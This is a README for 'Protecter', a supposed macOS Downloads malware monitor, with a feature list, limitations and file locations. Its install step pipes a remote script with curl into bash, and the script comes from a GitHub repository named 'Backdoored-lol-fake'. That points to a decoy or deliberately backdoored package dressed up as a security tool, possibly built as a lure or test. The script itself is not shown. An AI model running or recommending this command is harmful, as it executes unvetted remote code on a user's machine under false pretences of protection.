# Protecter for macOS

Protecter is a small original macOS Downloads monitor. It uses the Python 3 and AppleScript tools included with macOS; it does not require Homebrew or ClamAV.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
```

Creates **`~/Applications/Protecter.app`** and starts a background monitor at login.

## What it does

- Checks files in Downloads, including files already there on first run.
- Skips unchanged files on later passes.
- Looks for combinations of suspicious command patterns in common script files.
- Uses macOS Gatekeeper to assess downloaded app bundles.
- Moves flagged files into a local quarantine folder; it does not permanently delete them.
- Does not upload files.

**Limitations:** Protecter is a basic heuristic checker, not a full antivirus product. It can miss threats and can flag legitimate scripts or unsigned apps. Keep macOS security protections enabled and review quarantined items before restoring or deleting them.

## Locations

- App: `~/Applications/Protecter.app`
- Quarantine: `~/Library/Application Support/Protecter/Quarantine`
- Logs: `~/Library/Application Support/Protecter/Logs`
